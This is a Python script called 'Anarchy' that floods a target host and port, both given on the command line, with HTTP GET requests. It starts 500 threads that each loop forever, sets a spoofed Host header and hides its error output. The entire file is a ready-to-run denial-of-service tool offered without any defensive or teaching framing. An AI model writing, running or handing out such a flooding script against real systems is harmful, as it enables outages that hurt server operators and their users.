from datetime import datetime

import sys, socket, threading

#########################
#       Anarchy         #
#   Author: Hifumi1337  #
#########################

# Fake IP address
fake_ip = '192.168.0.1'

# Hides debugging errors - comment out to see debugging info
sys.tracebacklimit = 0

# Define our target
if len(sys.argv) == 3:
    target = socket.gethostbyname(sys.argv[1])  # Translate hostname to IPv4
    port = int(sys.argv[2])
else:
    print("Invalid amount of arguments")
    print("Syntax: python3 anarchy.py <IP> <PORT>")
    print("Example: python3 anarchy.py 127.0.0.1 80")

# Displays terminal output (banner)
print("-" * 50)
print("Attacking Target: {0}".format(target))
print("Attacking Port: {0}".format(port))
print("Time started: " + str(datetime.now()))
print("-" * 50)
print("""\
⠀⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀
⠀⠀⠀⣴⠿⠏⠀⠀⠀⠀⠀⠀ ⢳⡀⠀ ⡏⠀⠀⠀⠀⠀ ⢷
⠀⠀⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀⠀⠀   ⡇
⠀⠀⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿⠀⣸ Anarchy ⡇
⠀⠀⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀ ⣿⠀⢹⠀⠀⠀⠀⠀   ⡇
⠀⠀⠙⢿⣯⠄⠀⠀⠀⢀⡀⠀⠀⡿⠀⠀⡇⠀⠀⠀⠀  ⡼
⠀⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀⠀⠘⠤⣄ ⣠ ⠞⠀
⠀⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀
⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀
⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀⠀⣄⢸⠀⠀⠀⠀⠀⠀
⣿⣿⣧⣀⣿.........⣀⣰⣏⣘⣆⣀⠀
""")
print("Author: Hifumi1337: https://github.com/Hifumi1337")

attack_num = 0

# ANARCHY TIME
def anarchy():
    global attack_num

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        attack_num += 1
        print(attack_num)
        
        s.close()

# Loops entire attack on the server being targeted
for i in range(500):
    thread = threading.Thread(target=anarchy)
    thread.start()